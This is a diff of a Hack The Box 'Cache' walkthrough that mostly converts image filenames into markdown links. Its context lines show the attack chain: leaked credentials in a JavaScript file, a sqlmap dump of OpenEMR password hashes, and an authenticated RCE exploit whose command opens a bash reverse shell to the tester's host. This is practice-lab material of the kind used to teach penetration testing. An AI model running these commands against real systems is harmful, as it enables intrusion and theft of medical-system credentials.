@@ -1,4 +1,4 @@
-# HTB - LoFi
+# HTB - Cache
 
 #### Ip: 10.129.155.77
 #### Name: Cache
@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-htb_cache_card.png
+![htb_cache_card.png](../assets/cache_assets/htb_cache_card.png)
 
 ### Enumeration
 
@@ -37,35 +37,35 @@ Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds
 
 Looking at the site on port 80 we find a page about hacking and cybercrime:
 
-htb_cache_site.png
+![htb_cache_site.png](../assets/cache_assets/htb_cache_site.png)
 
 Kicking off some directory scanning we find a `/jquery` directory:
 
-htb_cache_jquery.png
+![htb_cache_jquery.png](../assets/cache_assets/htb_cache_jquery.png)
 
 Checking this out we find a link to http://cache.htb/jquery/functionality.js
 
 Which contains a username and password:
 
-htb_cache_creds.png
+![htb_cache_creds.png](../assets/cache_assets/htb_cache_creds.png)
 
 `ash:H@v3_fun`
 
 Using this we can login at `/login.html` where we find a page under construction:
 
-htb_cache_login.png
+![htb_cache_login.png](../assets/cache_assets/htb_cache_login.png)
 
 But enumerating this endpoint doesn't seem to reveal anything of interest.
 
 After getting stuck here forever,  I finally resorted to a hint and apparently the way forward is noticing the mention of HMS in ash's About Me page:
 
-htb_cache_hms.png
+![htb_cache_hms.png](../assets/cache_assets/htb_cache_hms.png)
 
 I had scanned the box with several different vhost wordlists, but apparently based on the About page we were supposed to figure out there was also a hms.htb.
 
 So, after adding hms.htb to `/etc/hosts` we find an OpenEMR login page:
 
-htb_cache_oemr.png
+![htb_cache_oemr.png](../assets/cache_assets/htb_cache_oemr.png)
 
 But unfortunately ash's password discovered earlier does not work here, nor do the OpenEMR defaults `admin:pass`.
 
@@ -161,17 +161,17 @@ Cool. Let's now  dump that `users_secure` table:
 └─$ sqlmap -r burp.txt --threads=10 --dbs -p eid --dbms mysql -D openemr -T users_secure --dump
 ```
 
-htb_cache_hash.png
+![htb_cache_hash.png](../assets/cache_assets/htb_cache_hash.png)
 
 Nice, that looks like the real deal this time.
 
 Let's crack this:
 
-htb_cache_cracked.png
+![htb_cache_cracked.png](../assets/cache_assets/htb_cache_cracked.png)
 
 We can confirm this works for the OpenEMR login: `openemr_admin:xxxxxx`
 
-htb_cache_in.png
+![htb_cache_in.png](../assets/cache_assets/htb_cache_in.png)
 
 Let's go back to that authenticated RCE exploit and give it a shot:
 
@@ -180,7 +180,7 @@ Let's go back to that authenticated RCE exploit and give it a shot:
 └─$ python2 openemr_rce.py http://hms.htb -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.180/9001 0>&1'
 ```
 
-htb_cache_shell.png
+![htb_cache_shell.png](../assets/cache_assets/htb_cache_shell.png)
 
 Cool, we've got a shell on cache now.
 
@@ -228,13 +228,13 @@ ash
 
 We can now grab the first flag:
 
-htb_cache_user.png
+![htb_cache_user.png](../assets/cache_assets/htb_cache_user.png)
 
 ### Privilege Escalation
 
 Running LinPEAS on the target we notice something interesting:
 
-htb_cache_lp.png
+![htb_cache_lp.png](../assets/cache_assets/htb_cache_lp.png)
 
 We can confirm the memcache port 11211 is open on cache:
 
@@ -320,7 +320,7 @@ root
 
 Nice. Now we can grab the final flag:
 
-htb_cache_root.png
+![htb_cache_root.png](../assets/cache_assets/htb_cache_root.png)
 
 Thanks for following along!
 
